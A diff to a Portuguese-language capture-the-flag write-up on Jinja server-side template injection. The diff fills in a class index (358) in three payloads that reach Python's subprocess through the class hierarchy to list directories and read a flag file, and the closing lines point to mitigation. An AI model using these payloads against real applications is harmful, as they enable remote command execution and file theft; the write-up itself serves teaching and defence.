@@ -52,7 +52,7 @@ Isso permitiu identificar a posição da classe em questão.
 4. Agora iremos procurar onde está localizada a flag. Primeiro rodaremos o seguinte comando:
 
 ```jinja
-{{''._class.mro[1].subclasses_()[X](
+{{''._class.mro[1].subclasses_()[358](
 'ls -la',
 shell=True,
 stdout=-1
@@ -64,7 +64,7 @@ stdout=-1
 Esse comando nos permite ver todos os diretórios e arquivos que temos, como em um terminal. Vamos acessar "secrets777666" para que vejamos o que tem dentro dele.
 
 ```jinja
-{{''._class.mro[1].subclasses_()[X](
+{{''._class.mro[1].subclasses_()[358](
 'ls -la secrets777666',
 shell=True,
 stdout=-1
@@ -76,7 +76,7 @@ stdout=-1
 Agora vamos acessar "flag.txt".
 
 ```jinja
-{{''._class.mro[1].subclasses_()[X](
+{{''._class.mro[1].subclasses_()[358](
 'cat secrets777666/flag.txt',
 shell=True,
 stdout=-1
@@ -110,5 +110,6 @@ Em um sistema real, podemos evitar essa vulnerabilidade da seguinte maneira:
 ### Conclusão
 
 O desafio demonstrou como uma simples falha na renderização de templates pode comprometer completamente uma aplicação. Como dito na seção sobre a vulnerabilidade, pudemos navegar pela hierarquia de classes, executar comandos do sistema e ler o conteúdo do arquivo "flag.txt", coisas que são extremamente críticas em ambientes reais. Alguém pode tomar controle do site se souber como explorar a seu favor essas falhas técnicas.
+
 
 Devemos manter boas práticas (citadas na seção de mitigação) para que nosso site seja seguro tanto para os desenvolvedores quanto para os clientes.
